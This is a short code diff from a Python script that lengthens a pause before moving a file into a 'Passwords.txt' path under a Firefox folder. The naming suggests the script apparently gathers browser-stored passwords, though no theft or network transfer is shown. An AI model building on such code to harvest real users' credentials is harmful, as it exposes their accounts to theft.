@@ -335,7 +335,7 @@ destination_path = os.path.join(firefox_folder, 'Passwords.txt')
 if not os.path.exists(firefox_folder):
     os.makedirs(firefox_folder)
 
-time.sleep(5)
+time.sleep(10)
 
 shutil.move(source_path, destination_path)
 
